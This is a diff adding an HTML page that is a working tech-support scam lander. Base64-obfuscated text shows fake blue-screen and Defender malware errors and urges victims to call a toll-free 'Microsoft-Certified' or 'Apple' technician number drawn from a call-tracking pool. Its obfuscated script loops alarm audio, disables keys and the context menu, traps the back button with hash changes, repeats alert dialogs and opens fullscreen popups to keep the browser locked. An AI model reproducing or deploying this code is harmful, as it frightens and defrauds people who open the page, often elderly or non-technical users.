@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SYSTEM SHUTDOWN CALL SUPPORT</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon"
+          type="image/png"
+          href="error2.png" />
+    <style type="text/css">
+        body {
+            margin-top:80px;
+            background-color: #ccc;
+            max-width: 768px;
+            font-family: monospace;
+            font-size:18px;
+            font-weight:bold;
+        }
+
+        .x1 {
+            position: relative;
+        }
+
+        .x1 .inx1 {
+            position: absolute;
+            top: 0px;
+            left: 0px;
+        }
+
+        .x1 .inx2 {
+            margin-left:54px;
+            font-size: 32px;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .x2 {
+            margin-top:30px;
+            margin-bottom:50px;
+        }
+
+        .x3 {
+            margin-bottom:24px;
+        }
+
+        #foxbox {
+            position: fixed;
+            top:0px;
+            bottom:0px;
+            right:0px;
+            left:0px;
+            background: rgba(33,33,33,0.3);
+            background-image: url('bgtt.png');
+
+            /*padding-top:15%;*/
+            padding-left:20%;
+            padding-right:20%;
+
+            display:none;
+        }
+
+        #foxbox #foxboxmsg {
+            background: rgb(255, 255, 255) none repeat scroll 0 0;
+            text-align: center;
+            padding: 12px;
+            overflow-y: auto;
+            height: 454px;
+            text-align: left;
+            overflow-x: hidden;
+            word-wrap: break-word;
+            word-break: break-all;
+            white-space: pre-wrap;
+            margin-right: 18px;
+            margin-bottom: 18px;
+            margin-top: 15px;
+            padding-left: 18px;
+        }
+
+        #foxbox #foxhold {
+            display: inline-block;
+            font-family: sans-serif;
+            font-size: 12px;
+            font-weight: normal;
+            margin-top: 12.5%;
+            max-height: 568px;
+            /* text-align: center; */
+            min-width: 280px;
+            max-width: 100%;
+            /* max-height: 33%; */
+            height: 100%;
+            background: rgb(255, 255, 255);
+            border:1px solid rgb(102, 102, 102);
+
+        }
+
+        #foxbox #foxhold.out {
+            outline: 2px solid rgb(41, 114, 255);
+        }
+
+        #foxbox #foxboxfoot {
+            height:56px;
+            line-height: 56px;
+            text-align: right;
+            border-top: 1px solid rgb(230,230,230);;
+            background-color:rgb(242,242,242);
+            padding: 0px 12px;
+        }
+
+        #foxboxfoot button {
+            width: 70px;
+            line-height: 16px;
+        }
+
+        #foxbox button:focus {
+            /*outline: 2px solid rgb(0,120,215);*/
+        }
+    </style>
+    <script type="text/javascript">
+
+    </script>
+    <script> // this script is so you can get fields our of the URL to use on the form
+    function getURLParameter(name) {
+        return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+        );
+    }
+    http_prefix = 'http';
+    </script>
+
+    <script src="https://d1a32x6bfz4b86.cloudfront.net/jsapi/v1/retreaver.min.js" type="text/javascript"></script>
+
+    <script>
+        var ran = false;  //Flag we have not run the script to pull the number yet
+        var loco = ""; //The page that we will load on a second pop
+        var msg = "";
+
+//figure out what to use for default number and number loaded on subsequent load
+        var default_number = "(877)-536-0029";
+        var default_plain_number = "8775360029";
+        var number = "(877)-536-0029"; //use this variable for the formatted number to display
+        var plain_number = "8775360029"; //use this variable for the hyperlink if used <a href="tel:+1"+ plain_number +"">
+
+//allow for the traffic source to send in their own default number if a number can't be obtained from the pool
+        var dn = getURLParameter('dn');
+        if (dn != '') { //if we going to use a default number different for each affiliate
+            default_plain_number = dn;
+            plain_number = dn;
+            var dfn = getURLParameter('dfn'); //get the default formatted number sent in
+            if (dfn == "") dfn = dn; //if no formatted number just use it unformatted
+            default_number = dfn; //so we have it in a good format as well
+            number = dfn;
+        }
+
+    </script>
+
+    <script type="text/javascript" defer>
+        function loadNumber() {
+
+
+            if (!ran) {
+                if (!getURLParameter('tfn')) { //if we don't have the phone# in the URL, get it the first time
+
+                    // Initialize the campaign using the campaign key from your campaign page.  On the line below, nothing should ever need to change but the key
+                    var campaign = new Callpixels.Campaign({campaign_key: ''});
+
+                    // Set the tags we want to use in order to find a matching number.  Format:   var tags = {calling_about: 'sales', currently_insured: 'no'}; format is basically var tags = {tag1: 'value1', tag2: 'value2', etc};
+                    var tags = {lander: 'system'}; //leave like this if you are not trying to send any tags, or replace with above format.
+
+                    // request a number that matches the tags. Format: campaign.request_number(tags, function (matching_number){}, function(error){});
+                    campaign.request_number(tags,
+                            function (matching_number) {
+                                number = matching_number.get('formatted_number');
+                                plain_number = matching_number.get('plain_number');
+
+                                // Save the number so we can reference it later.
+                                window.callpixels_number = matching_number;
+
+                            }, //end the function (matching_number)
+                            // 3rd Parameter of the campaign.request_number function is the error handling
+                            function (error) {
+                                number = default_number; //Since this isn't being returned from function, this is actually a formatted string to use for the default number, usually a campaign number (must be static)
+                                plain_number = default_plain_number;
+                            } //end the error function
+                    ); //end the campaign.request_number function
+                } //end if reloading
+
+
+
+                ran = true; //so we don't get the number more than once
+                loco = "gonow.html?tfn=" + plain_number + "&ftfn=" + number + "";
+                loco_params = "?tfn=" + plain_number + "&ftfn=" + number + "";
+
+                formNum1 = document.getElementById('FormattedNumber1');
+                formNum2 = document.getElementById('FormattedNumber2');
+
+                if (formNum1) {
+                    FormattedNumber1.innerHTML = number;
+                }
+                if (formNum2) {
+                    FormattedNumber2.innerHTML = number;
+                }
+
+
+//                    function confirmExit() {
+//                        window.open(loco, "", "fullscreen=yes,directories=no,top=0,left=0,location=no,menubar=no,resizable=no,scrollbars=0,status=no,toolbar=no,titlebar=no,height=900,width=1400");
+//                        window.open(loco, "", "fullscreen=yes,directories=no,top=0,left=0,location=no,menubar=no,resizable=no,scrollbars=0,status=no,toolbar=no,titlebar=no,height=900,width=1400");
+//
+//                    }
+//                    window.onbeforeunload = confirmExit;
+
+//                    myFunction(number);
+
+
+            } //end the if Not Ran check
+        } //end the loadNumber function
+    </script>
+
+</head>
+<body>
+
+
+
+<script src="plform.js" type="text/javascript"></script>
+<div id="windef">
+    CiAgICAgICAgICAgIDxkaXYgY2xhc3M9IngxIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW54MSI+CiAgICAgICAgICAgIDxpbWcgc3JjPSJjYW5jZWwucG5nIiBhbHQ9IngiLz4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbngyIj4KICAgICAgICAgICAgQlNPRDogZGxsUmVnaXN0ZXJTZXR0aW5nIGhhcyBkZXRlY3RlZCB0aGUgZXJyb3IgY29kZSAweDgwMDYwNDAyCiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ4MiI+WW91ciB7b3N9IERlZmVuZGVyIGVuY291bnRlcmVkIGFuIGVycm9yIEVycm9yIGNvZGU6IDB4ODAwMTZDRkE8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ieDMiPkVycm9yIGNvZGU6IDB4ODAwMTZDRkEgaW4gYXBwbGljYXRpb24ge25hbWV9IHt2ZXJzaW9ufSwgcHJvY2VzcyBpZDogW3JhbmRvbToxMDE6Mjk5XTwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0ieDMiPgogICAgICAgICAgICBTVE9QOiAweDAwMDAwMDdCIElOQUNDRVNTSUJMRV9CT09UX0RFVklDRQogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9IngzIj4KICAgICAgICAgICAgRXJyb3IgY29kZSAweDgwMDYxMEEzIHdoaWxlIHN0YXJ0aW5nIHtvc30gRGVmZW5kZXIgZHVlIHRvIE1hbHdhcmUgQWN0aXZpdHkgb24geW91ciB7b3N9CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0ieDMiPgogICAgICAgICAgICB7b3N9IERlZmVuZGVyIHRpbWUgb3V0IGVycm9yIGNvZGU6IDB4MDAwQjAwNDMKICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ4MyI+CiAgICAgICAgICAgIEVycm9yIGNvZGUgMHg4MDA2MTBBMyB1bmF1dGhvcml6ZWQgYWNjZXNzIHRvIHJlZ2lzdHJ5IGRsbAogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9IngzIj4KICAgICAgICAgICAgUGxlYXNlIGNvbnRhY3QgW3RlY2huaWNpYW5fdmVuZG9yXSB0ZWNobmljaWFucyBBdCBUb2xsIEZyZWUgcGhvbmUtbnVtYmVyOiAKICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ4MyI+CiAgICAgICAgICAgIDxkaXYgaWQ9IkZvcm1hdHRlZE51bWJlcjEiPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9IngzIj4KICAgICAgICAgICAgdG8gaW1tZWRpYXRlbHkgcmVjdGlmeSB0aGUgaXNzdWUgdG8gcHJldmVudCBEYXRhIExvc3MuCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIA==
+
+</div>
+
+<script type="text/javascript">
+
+    var baseStr="RGVhciBjdXN0b21lciwKCkEgc2VyaW91cyBtYWxmdW5jdGlvbiBoYXMgYmVlbiBkZXRlY3RlZCB3aXRoIHtvcy5mYW1pbHl9IHtvcy52ZXJzaW9ufSBhbmQgeW91ciB7bmFtZX0ge3ZlcnNpb259LiBQbGVhc2UgY2FsbCB0aGUgdG9sbC1mcmVlIG51bWJlciBiZWxvdyBmb3IgYSBbdGVjaG5pY2lhbl92ZW5kb3JdIHRlY2huaWNpYW4gdG8gaGVscCB5b3UgcmVzb2x2ZSB0aGUgaXNzdWU6CgpbbnVtYmVyXQoKRm9yIHlvdXIgc2FmZXR5LCBjbG9zaW5nIHRoZSB7bmFtZX0gYnJvd3NlciBoYXMgYmVlbiBkaXNhYmxlZCB3aXRob3V0IHN1cHBvcnQgb2YgdGhlIFt0ZWNobmljaWFuX3ZlbmRvcl0gdGVjaG5pY2lhbiB0byBhdm9pZCBjb3JydXB0aW9uIHRvIHRoZSByZWdpc3RyeSBvZiB5b3VyIHtvc30gb3BlcmF0aW5nIHN5c3RlbQoKUGxlYXNlIGNvbnRhY3Qgc3VwcG9ydCBhdCB0aGUgdG9sbC1mcmVlIEhlbHBsaW5lIFtudW1iZXJdCgpETyBOT1QgU0hVVCBET1dOIE9SIFJFU1RBUlQgVEhFIENPTVBVVEVSLCBET0lORyBUSEFUIE1BWSBMRUFEIFRPIERBVEEgTE9TUyBBTkQgUE9TU0lCTEUgRkFJTFVSRSBPRiBUSEUgT1BFUkFUSU5HIFNZU1RFTSBBTkQgUE9URU5USUFMIE5PTiBCT09UQUJMRSBTSVRVQVRJT04gUkVTVUxUSU5HIElOIENPTVBMRVRFIERBVEEgTE9TUywgQ09OVEFDVCBNSUNST1NPRlQgQ0VSVElGSUVEIFRFQ0hOSUNJQU5TIFRPIFJFU09MVkUgVEhFIElTU1VFIENBTExJTkcgVE9MTCBGUkVFIC0gW251bWJlcl0KCgogICAgICAgIA==",
+            firstBox=null,newSubMotion=null;function newSub(a){if(!ran||!firstBox||newSubMotion===true){return}var c=Math.floor((Math.random()*1000000)+1),e=window.location.hostname+window.location.pathname,d="http://"+e+loco_params;if(a!==false){return d}window.location=d;newSubMotion=true}if(typeof(Audio)=="function"){var erra=new Audio("call.mp3"),wding=new Audio("di.wav");erra.loop=true;erra.onended=function(){setTimeout(function(){erra.currentTime=0;erra.play()},3500)};erra.ontimeupdate=function(){}}var cdcc=0;function hashinc(){document.location.hash=cdcc++;setTimeout(hashinc,1830)}function errbox(a){firstBox=true;rawst=Base64.decode(baseStr);st_temp=doPlatform(rawst);st=myReplacements(number,technician_vendor,st_temp);if(a){return st+st+st+st+st+st+st}alert(st+st+st+st+st+st+st)}var base=window.location.href;var nocheese=function(a){foxoutline();if(a=="Undefined"){return false}else{a.preventDefault()}return false};document.onkeydown=nocheese;document.body.onkeypress=nocheese;document.body.oncontextmenu=nocheese;window.onbeforeunload=function(a){};var g_nb=1,g_hr=window.location.href,noback_start=false;function noback(){if(noback_start===false){var a=window.location.href;g_hr=a.substr(0,a.indexOf("#"));noback_start=true}window.location.href=g_hr+"#"+g_nb++;setTimeout(function(){window.location.href=g_hr+"#"+g_nb++;setTimeout(function(){start_ts()},100)},50)}function whenback(){var a=window.location.hash;if(a.substring(1)<(g_nb-1)){noback()}}function errfirm(){var a=confirm(errbox(1));if(a){window.location=g_hr}else{window.location=g_hr}}var foxOut=false;function foxbox(a){foxOut=true;if(platform&&platform.description.indexOf("IE")>-1&&platform.description.indexOf("mode)")>-1||platform&&platform.description.indexOf("IE 8.0")>-1){errbox();noback();return}document.getElementById("foxboxmsg").innerHTML=errbox(1);foxshow()}function foxpop(){window.open(newSub(1),"","fullscreen=yes,directories=no,top=0,left=0,location=no,menubar=no,resizable=no,scrollbars=0,status=no,toolbar=no,titlebar=no,height=900,width=1400");setTimeout(function(){newSub(false)},100)}function foxgone(){foxOut=false;document.getElementById("foxbox").style.display="none"}function foxshow(){document.getElementById("foxbox").style.display="block";document.getElementById("foxbtn").focus()}function foxoutline(){document.getElementById("foxhold").className="out";foxanimoutl();if(wding){wding.play()}}var fa_i=0,fa_t=null;function foxanimoutl(){var a=document.getElementById("foxhold");if(fa_i<7){if(a.className=="out"){a.className=""}else{a.className="out"}fa_t=setTimeout(foxanimoutl,175);fa_i++}else{fa_i=0;clearTimeout(fa_t);fa_t=null;var b=document.getElementById("foxbtn");if(b){b.focus()}}}var m_x=null,m_y=null;setInterval(mtrackcheck,30);function mtrack(a){if(platform.name=="IE"){m_x=window.event.clientX+document.body.scrollLeft;m_y=window.event.clientY+document.body.scrollTop}else{m_x=a.pageX;m_y=a.pageY}}function mtrackcheck(){if(m_y!==null&&m_y<=70&&fa_t==null){if(platform&&platform.name=="Firefox"){foxoutline();leaf_switch(true);return}else{if(normIE_check()===true){foxgone();errbox();foxshow()}else{newSub(false)}}}else{if(m_y>20){leaf_switch(false)}}}var leaf_set=false;function leaf_switch(a){if(a==true){window.onbeforeunload=function(){return errbox(1)};leaf_set==true}else{if(a==false){window.onbeforeunload=="";leaf_set==false}}}var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(j){var m="";var d,b,g,p,c,l,k;var h=0;j=Base64._utf8_encode(j);while(h<j.length){d=j.charCodeAt(h++);b=j.charCodeAt(h++);g=j.charCodeAt(h++);p=d>>2;c=(d&3)<<4|b>>4;l=(b&15)<<2|g>>6;k=g&63;if(isNaN(b)){l=k=64}else{if(isNaN(g)){k=64}}m=m+this._keyStr.charAt(p)+this._keyStr.charAt(c)+this._keyStr.charAt(l)+this._keyStr.charAt(k)}return m},decode:function(j){var m="";var d,b,g;var p,c,l,k;var h=0;j=j.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(h<j.length){p=this._keyStr.indexOf(j.charAt(h++));c=this._keyStr.indexOf(j.charAt(h++));l=this._keyStr.indexOf(j.charAt(h++));k=this._keyStr.indexOf(j.charAt(h++));d=p<<2|c>>4;b=(c&15)<<4|l>>2;g=(l&3)<<6|k;m=m+String.fromCharCode(d);if(l!=64){m=m+String.fromCharCode(b)}if(k!=64){m=m+String.fromCharCode(g)}}m=Base64._utf8_decode(m);return m},_utf8_encode:function(c){c=c.replace(/\r\n/g,"\n");var a="";for(var d=0;d<c.length;d++){var b=c.charCodeAt(d);if(b<128){a+=String.fromCharCode(b)}else{if(b>127&&b<2048){a+=String.fromCharCode(b>>6|192);a+=String.fromCharCode(b&63|128)}else{a+=String.fromCharCode(b>>12|224);a+=String.fromCharCode(b>>6&63|128);a+=String.fromCharCode(b&63|128)}}}return a},_utf8_decode:function(c){var a="";var d=0;var b=c1=c2=0;while(d<c.length){b=c.charCodeAt(d);if(b<128){a+=String.fromCharCode(b);d++}else{if(b>191&&b<224){c2=c.charCodeAt(d+1);a+=String.fromCharCode((b&31)<<6|c2&63);d+=2}else{c2=c.charCodeAt(d+1);c3=c.charCodeAt(d+2);a+=String.fromCharCode((b&15)<<12|(c2&63)<<6|c3&63);d+=3}}}return a}};function doPlatform(e){var f=0,d="";var a=e.indexOf("{"),c=null,b=null;if(a>-1){c=e.indexOf("}");if(c){f=c;d=platformReplace(a,c,e)}if(f){if(d.indexOf("{")>-1&&d.indexOf("}")>-1){d=doPlatform(d)}}}return d}function platformReplace(d,c,g){var b="";var e=g.substr(d,(c-d)+1);var a=e.replace("}","");a=a.replace("{","");tagSplit=a.split(".");if(tagSplit.length==1){b=platform[tagSplit[0]]}else{b=platform[tagSplit[0]][tagSplit[1]]}var f=g.replace(e,b);return f}function myReplacements(c,h,j){var e="",a=null,d=null,i,f=null,b=null,g=null;e=j.replace(/\[number\]/gi,c);e=e.replace(/\[technician_vendor\]/gi,h);a=e.indexOf("[random:");d=e.indexOf("]",a);if(a>-1&&d>-1){i=e.substr(a,(d-a)+1);f=i.replace("[","").replace("]","");g=f.split(":");if(g){b=myRandl(g[1],g[2]);e=e.replace(i,b)}}return e}function myRandl(b,c){var a=Math.random()*(parseInt(c)-parseInt(b)+1)+parseInt(b);return Math.floor(a)}function windef_put(){var a=document.getElementById("windef");if(platform){if(platform.os.family=="OS X"){technician_vendor="Apple Macintosh"}else{technician_vendor="Microsoft-Certified"}}else{technician_vendor="Microsoft-Certified"}var b=document.getElementById("windef");b.innerHTML=myReplacements(number,technician_vendor,doPlatform(Base64.decode(b.innerHTML)))}if(window.attachEvent){window.attachEvent("onload",function(){if(erra){erra.play()}setTimeout(windef_put,200);setTimeout(function(){loadNumber();noback()},450)});window.attachEvent("onhashchange",whenback);window.attachEvent("onmousemove",mtrack);window.attachEvent("onblur",doBlur);document.onmousemove=mtrack}else{window.addEventListener("load",function(){erra.play();windef_put();setTimeout(function(){loadNumber();noback()},100)});window.addEventListener("hashchange",whenback);window.addEventListener("mousemove",mtrack);window.addEventListener("blur",doBlur)}function start_ts(){if(platform&&platform.name=="Firefox"){foxbox()}else{errbox();foxbox()}}function compat_check(){if(platform&&platform.description.indexOf("IE")>-1&&platform.description.indexOf("mode)")>-1||platform&&platform.description.indexOf("IE 8.0")>-1){return true}else{return false}}function normIE_check(){if(platform&&platform.description.indexOf("IE")>-1&&platform.description.indexOf("mode)")===-1&&platform.description.indexOf("Window")>-1){return true}else{return false}}function doBlur(){if(firstBox===true&&foxOut===true){newSub(false)}};
+</script>
+<div id="foxbox">
+
+    <div id="foxhold">
+        <div id="foxboxmsg"></div>
+        <div id="foxboxfoot"><button onclick="foxpop()" id="foxbtn">OK</button></div>
+    </div>
+
+</div>
+
+
+
+
+
+</body>
+</html>
